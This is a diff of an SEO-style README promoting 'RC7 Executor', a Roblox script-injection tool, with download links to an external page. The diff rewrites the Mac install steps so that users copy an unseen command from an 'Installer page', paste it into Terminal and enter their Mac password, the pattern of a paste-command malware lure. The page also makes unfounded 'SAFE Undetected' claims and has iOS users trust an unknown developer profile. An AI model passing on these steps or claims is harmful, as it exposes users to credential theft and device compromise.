@@ -1,10 +1,10 @@
-# RC7 Executor - SAFE Undetected PC/Mobile Script Executor | Free App 🚀
+# RC7 Executor — SAFE Undetected PC/Mobile Script Executor | Free App 🚀
 
-Welcome to the official GitHub repository documentation for **RC7 Executor**! 🚀 This powerful tool empowers Roblox players to execute custom Lua scripts, unlocking new levels of creativity, fun, and customization in your favorite games. Whether you're exploring automation features, testing unique ideas, or enhancing gameplay experiences, **RC7 Executor** stands out as a reliable choice in the community.
+Welcome to the official GitHub repository documentation for **RC7 Executor**! 🚀 This powerful tool empowers Roblox players to execute custom Lua scripts, unlocking new levels of creativity, fun, and customization in your favorite games. Whether you're exploring automation features, testing unique ideas, or enhancing gameplay experiences, **rc7 executor** stands out as a reliable choice in the community.
 
 ## [🌕 Download RC7 Executor Now](https://rc7-devop.github.io/rc7/)
 
-**RC7 Executor** brings a sleek, modern interface combined with robust performance to make script execution seamless and enjoyable. 🌟 Many users appreciate its balance of speed, stability, and ease of use. As we move into 2026, staying updated with the latest Roblox changes is crucial, and this tool continues to evolve to meet those demands. **RC7 Executor safe** usage starts with downloading from trusted sources like this GitHub page — always verify files and follow best practices to protect your device. Players often ask **is RC7 Executor safe**, and when obtained officially, it prioritizes user security through regular checks and community feedback.
+**RC7 Executor** brings a sleek, modern interface combined with robust performance to make script execution seamless and enjoyable. 🌟 Many users appreciate its balance of speed, stability, and ease of use. As we move into 2026, staying updated with the latest Roblox changes is crucial, and this tool continues to evolve to meet those demands. **rc7 executor safe** usage starts with downloading from trusted sources like this GitHub page — always verify files and follow best practices to protect your device. Players often ask **is rc7 executor safe**, and when obtained officially, it prioritizes user security through regular checks and community feedback.
 
 <img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/ebae1bd8-a493-4bf7-906f-d05864e634ba" />
 
@@ -39,9 +39,7 @@ In a sea of options, **rc7 executor** shines for several compelling reasons:
 - Strong emphasis on safety practices when used responsibly.
 - Free access removes barriers, letting everyone enjoy premium-like capabilities.
 
-**official rc7 RC7 Executor** delivers genuine value through transparent updates and community trust. Players frequently praise **is rc7 executor detected** concerns being minimal with proper usage and latest versions.
-
-**RC7 Executor level** of polish sets it apart, offering a professional feel in every interaction.
+**RC7 Executor** delivers genuine value through transparent updates and community trust. Players frequently praise **is rc7 executor detected** concerns being minimal with proper usage and latest versions.
 
 ## Benefits 🎁
 
@@ -84,7 +82,7 @@ Installation varies by platform — follow these detailed steps carefully for a 
 
 ### On iOS 🍎
 
-1. Download the appropriate IPA from our official source.
+1. Download the appropriate IPA from our Official source.
 2. Trust the developer profile in Settings > General > VPN & Device Management.
 3. Install Roblox from App Store or sideload if needed.
 4. Launch executor app and follow on-screen prompts for injection.
@@ -92,11 +90,12 @@ Installation varies by platform — follow these detailed steps carefully for a 
 
 ### On Mac 🍏
 
-1. Download the macOS-compatible package (often .dmg or .exe).
-2. Open the file and drag the app to Applications folder.
-3. Run Roblox via browser or app.
-4. Launch rc7 executor and grant accessibility permissions.
-5. Attach to process and proceed with scripting.
+1. Hit the **Download** to open the Installer page and **copy** the command line.
+2. Press `Cmd + Space` on your keyboard, type **"Terminal"** into Spotlight, and hit **Enter**.
+3. Click inside the Terminal window, **paste** the command you copied, and press **Enter**.
+4. Type your **Mac password** when prompted. 
+5. Press **Enter** one last time to begin the installation process.
+6. Once the process finishes, **RC7.app** will be available in your **Applications** folder.
 
 Follow each step meticulously to avoid common pitfalls! 🔍
 
@@ -135,6 +134,6 @@ Typically every few weeks or after major Roblox changes to ensure continued comp
 
 **RC7 Executor** represents a pinnacle of user-friendly, powerful scripting for Roblox enthusiasts. With its blend of speed, features, safety focus, and community backing, it delivers an exceptional experience for creative gameplay. Dive in, explore responsibly, and elevate your adventures today!
 
-Thank you for choosing RC7 Executor — happy scripting! ❤️
-
 ## [🌕 Download RC7 Executor Now](https://rc7-devop.github.io/rc7/) 🚀
+
+Thank you for choosing RC7 Executor — happy scripting!
